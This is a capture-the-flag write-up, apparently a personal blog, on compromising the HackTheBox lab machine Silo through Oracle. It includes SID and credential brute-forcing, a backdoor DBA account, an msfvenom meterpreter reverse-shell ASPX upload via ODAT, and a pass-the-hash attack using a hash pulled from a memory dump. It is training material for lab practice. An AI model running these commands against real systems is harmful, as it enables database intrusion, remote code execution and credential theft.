# Introduction

Once again, coming at you with a new [HackTheBox](https://www.hackthebox.eu/){:target="_blank"} blog! This week's retired box is *Silo* by [@egre55](https://twitter.com/egre55){:target="_blank"}. A medium rated machine which consits of Oracle DB exploitation. From experience, Oracle databases are often an easy target because of Oracle's business model. The products itself are free and can be downloaded rather easily, however the updates are **paid**. Most people refuse to pay for a silly update and that means that there's a high chance of finding an outdated Oracle install. What does that mean? *Many* vulnerabilities and even *more* shells! Enough talking though, let's get into hacking! <!--more-->

# Disclaimer
My usual policy when doing writeups is to avoid using exploitation frameworks such as *Metasploit* or *Empire* because exams like OSCP don't allow their usage. Unfortunately due to nature of this box being heavily based around Oracle exploitation, I have no other choice. Crafting my own [TNS](https://en.wikipedia.org/wiki/Transparent_Network_Substrate){:target="_blank"} packets for enumeration & exploitation needs would only be a waste of time since I can't match the efficiency of the professional frameworks anyways. Well, at least in such a short period of time.

***

# Prerequisities
As we are going to use some frameworks ([Metasploit](https://www.metasploit.com/download){:target="_blank"} and [ODAT](https://github.com/quentinhardy/odat){:target="_blank"}), we need to do their required setups. Also, there's another catch - thanks to copyright issues neither of the frameworks have actual Oracle drivers that are needed for interaction with Oracle products preinstalled. If you want to exploit the machine with previously mentioned tools you need to set up the drivers yourself. I attached few links below to help you with what is needed.

```
Notice that port 80 - `Microsoft IIS httpd 8.5` is opened. Just note it down, it will be useful later on. 
Let's focus on port 1521 (and sort of port 49160) instead - `Oracle TNS listener 11.2.0.2.0 (unauthorized)`.
Doing some enumeration I find out that this particular version of Oracle listener is vulnerable to remote TNS poisoning. 

<a href="/img/blog/htb-silo/htb-silo-01.png" target="_blank"><img class="centerImgMedium" src="/img/blog/htb-silo/htb-silo-01.png"></a>

It's a remote man in the middle attack! How does it work 101: Oracle users connect to a database through a listener. The listener forwards all their data to the actual database. An attacker can craft a TNS register packet which doesn't require any authentication and set up his / her own listener with the very same service name as the legit listener. This causes traffic to be load balanced (evenly distributed between the 2 listeners). If lucky, some of the traffic goes through the malicious listener where an attacker can capture data (login details). More about it can be read [here](https://www.informationsecuritybuzz.com/articles/oracle-tns-listener-poison-attack/){:target="_blank"} in greater detail. This sort of attack would be really handy on a busy network where users constantly log in / log out. Unfortunately for us, this is just a lab machine. A MITM attack is not going to yield useful results (there are no users to login). Moving on... 

The Oracle install itself seems to be pretty well patched up. What else do we have then? Well, why not go for the low hanging fruit? Trying out bruteforcing can't really hurt us, can it? 

### - Fun with bruteforcing
In order to progress into the database itself we need to identify possible instances first. Oracle uses something called *SID* - stands for *system identifier* or *Oracle system ID*, depending on who you ask, to identify unique database instances. These can be bruteforced using Metasploit's `auxiliary/admin/oracle/sid_brute` module.

<a href="/img/blog/htb-silo/htb-silo-02.png" target="_blank"><img class="centerImgHuge" src="/img/blog/htb-silo/htb-silo-02.png"></a>
 
Positive results! 3 protected instances were discovered - **XE**, **PLSEXTPROC** and **CLREXTPROC**. Now we can go ahead and try to bruteforce usernames / passwords associated with each instance. Again, Metasploit has a module for this - `auxiliary/admin/oracle/oracle_login`.

<a href="/img/blog/htb-silo/htb-silo-03.png" target="_blank"><img class="centerImgHuge" src="/img/blog/htb-silo/htb-silo-03.png"></a>

Bruteforcing the **XE** instance yielded a valid username and a password (default login) - `scott:tiger`.
> Note: Don't forget to do `set SID XE` to switch in between the instances in Metasploit.

Valid credentials mean that we can connect to the **XE** instance and start querying the database for possible information. As it turns out, *scott* is also granted **SYSBDA** privilege. Think of it as something like sudo - it gives you extra flexibility and higher privileges in case you want to do some database altering, user administration and the list continues. 

***

# Exploitation

### - Creating your own privileged user
In the previous section we gathered all needed information - credentials `scott:tiger` and the fact that *scott* can run SQL queries as **SYSDBA**. I proceed to create my own backdoored user with access to the whole database, because I don't want to interfere with other players. Then connect to the database via *sqlplus* or a GUI tool like *DBeaver* and start typing the magic commands!

```console
root@EdgeOfNight:~# sqlplus scott/tiger@(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(Host=10.10.10.82)(Port=1521))(CONNECT_DATA=(SID=XE))) AS SYSDBA

SQL*Plus: Release 12.2.0.1.0 Production on Fri Aug 3 14:04:16 2018

Copyright (c) 1982, 2016, Oracle.  All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> CREATE USER v3ded IDENTIFIED BY v3ded99;

User created.

SQL> GRANT dba TO v3ded;

Grant succeeded.
```
> Note: This creates user v3ded with password v3ded99 who owns dba (basically the whole database. TL;DR - no need to append every command with SYSDBA).


### - ODAT
Here comes ODAT into the play. It will help us compromise the system! First of all run the tool with `python odat.py --help` to shows all its capabilities:
```console
root@EdgeOfNight:~# python odat.py --help
usage: odat.py [-h] [--version]

There are many interesting options we can utilize. If you want to be "loud" you can check all the options that will work by selecting the *all* command.
```console
root@EdgeOfNight:~# python odat.py all -s 10.10.10.82 -d XE -U v3ded -P v3ded99

```
`DBMS_XSLPROCESSOR library` is enabled and therefore allows us to put any files onto the machine. Here is the command that will do so:
```console
root@EdgeOfNight:~# python odat.py dbmsxslprocessor -s 10.10.10.82 -d XE -U v3ded -P v3ded99 --putFile "c:\Windows\\" "v3ded.txt" "/tmp/v3ded.txt" 
```
> Arguments for DBMS_XSLPROCESSOR: --putFile remotePath remoteFile localFile

You might be asking, how do I missuse this simple file upload? Good question. If you still remember, there is a running IIS web server. By uploading an ASPX webshell onto the server and then activating it by visiting the shell's page you can get a reverse shell (or any other code execution for that matter). The shell I will be using will be Metasploit's *meterpreter* (you can use anything). 

First generate a shell with msfvenom:
```console
root@EdgeOfNight~# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.15.193 LPORT=443 -f aspx > /tmp/v3dedShell.aspx
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 500 bytes
Final size of aspx file: 3606 bytes

```
and proceed to upload it with `DMBS_XSLPROCESSOR` into `C:\inetpub\wwwroot\` (default IIS) directory. Start your Metasploit listener and activate the payload.

<a href="/img/blog/htb-silo/htb-silo-05.png" target="_blank"><img class="centerImgHuge" src="/img/blog/htb-silo/htb-silo-05.png"></a>

In the first upper pane I upload an *aspx* webshell, in the middle one I start my Metasploit listener and in the last one I use *curl* to trigger my shell. 

<a href="/img/blog/htb-silo/htb-silo-06.png" target="_blank"><img class="centerImgHuge" src="/img/blog/htb-silo/htb-silo-06.png"></a>

Congratulations on the shell! Go and get your user flag! You deserve it.

# Privilege escalation

Snooping around the machine I find an user called Phineas:
<a href="/img/blog/htb-silo/htb-silo-07.png" target="_blank"><img class="centerImgMedium" src="/img/blog/htb-silo/htb-silo-07.png"></a>

Navigating to his Desktop directory I see an interesting file called "Oracle issues.txt":
<a href="/img/blog/htb-silo/htb-silo-08.png" target="_blank"> <img class="centerImgMedium" src="/img/blog/htb-silo/htb-silo-08.png"></a>

> IMPORTANT: View this file by downloading it into your machine (via FTP, SMB...) and opening it in a text editor! Otherwise you might have some unicode problems and the file won't load correctly.

<a href="/img/blog/htb-silo/htb-silo-09.png" target="_blank"><img class="centerImgMedium" src="/img/blog/htb-silo/htb-silo-09.png"></a>

Heed my warnings in the note above, and make sure you **really** view the file in a text editor. If you just print the file content the `£` sign won't render and therefore the password to the dropbox link will not work. Save yourself 2 hours of crying. Not everyone had that option (stupid me...). Anyways, the text file mentions a memory dump. That's a good sign for us, because there's a high chance that that memory dump will contain valuable information. Many tools will analyze memory for us and pull out valuables like passwords. So it's quite clear we need to do a bit of memory analysis. 

### - Using Volatility to extract passwords 
> **Note**: I made a mistake in this section, stating that Silo is running on Windows Server 2008, when in fact it's running on Windows Server 2012. Sorry!

For this purpose I chose [Volatility](https://github.com/volatilityfoundation/volatility){:target="_blank"}! Volatiliy is able to analyze memory and extract certain pieces it considers valuable. Exactly what we need.

Firstly, view the dump info with `imageinfo` in order to retrieve possible profiles (important for offsets; will be clearer later on):
```console
root@EdgeOfNight:~# python vol.py -f SILO-20180105-221806.dmp imageinfo

          Suggested Profile(s) : Win8SP0x64, Win81U1x64, Win2012R2x64_18340, Win10x64_14393, Win10x64, Win2016x64_14393, Win10x64_16299, Win2012R2x64, Win2012x64, Win8SP1x64_18340, Win10x64_10586, Win8SP1x64, Win10x64_15063 (Instantiated with Win10x64_15063)

     Image local date and time : 2018-01-05 22:18:07 +0000
```
Volatility suggests many possible profiles to choose from. We can rule out most of them because from our enumeration phase we found out thanks to *nmap* that this machine is running Windows 2008. You could also get this information by typing `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"` into our shell. In the end we have 2 profiles to consider - `Win8SP1x64_18340` and `Win8SP1x64`. You can rule out the incorrect one by viewing the dump's hivelist. Viewing hivelist of `Win8SP1x64` we get:
```console
root@EdgeOfNight:~# python vol.py -f ../SILO-20180105-221806.dmp --profile=Win8SP1x64 hivelist

```
and viewing `Win8SP1x64_18340`'s hivelist we get:
```console
root@EdgeOfNight:~# python vol.py -f SILO-20180105-221806.dmp --profile=Win8SP1x64_18340 hivelist

------------------ ------------------ ----
```
It's clear that the second one is incorrect as it wasn't able to find any results. Now onto dumping passwords! Because we have both **SAM** (*0xffffc00000619000*) and **SYSTEM** (*0xffffc00000028000*) hive offsets, we can use Volatility to parse these 2 together. This allows us to extract NTLM password hashes:

<a href="/img/blog/htb-silo/htb-silo-10.png" target="_blank"><img class="centerImgLarge" src="/img/blog/htb-silo/htb-silo-10.png"></a>

Admininistrator's NT hash:<br> `9e730375b7cbcebf74ae46481e07b0c7`. We have 2 options - we can either crack it (no luck), or try to do [pass the hash attack](https://www.sans.org/reading-room/whitepapers/testing/pass-the-hash-attacks-tools-mitigation-33283){:target="_blank"}. I'll go with the latter. 

<a href="/img/blog/htb-silo/htb-silo-11.png" target="_blank"><img class="centerImgHuge" src="/img/blog/htb-silo/htb-silo-11.png"></a>

> Note: Make sure you add silo.htb into your [hosts file](https://www.makeuseof.com/tag/modify-manage-hosts-file-linux/){:target="_blank"}. It won't work with plain IP address.

Alternatively, you can use Metasploit's *psexec* module (`exploit/windows/smb/psexec`):

<a href="/img/blog/htb-silo/htb-silo-12.png" target="_blank"><img class="centerImgHuge" src="/img/blog/htb-silo/htb-silo-12.png"></a>
<a href="/img/blog/htb-silo/htb-silo-13.png" target="_blank"><img class="centerImgLarge" src="/img/blog/htb-silo/htb-silo-13.png"></a>

Congratulations, you've acquired administrator access on the machine! Get that sweet flag!

# Conclusion
Thanks for reading guys. This box is one of my all time favorites because it taught me the most (not kidding, this machine made me google a lot!). I also liked the approach one needs to take in order to fully compromise the box. It's not everyday you get to exploit an Oracle database, do some memory forensics and pass the hash :). That out of the way, I hope to see you next time too!
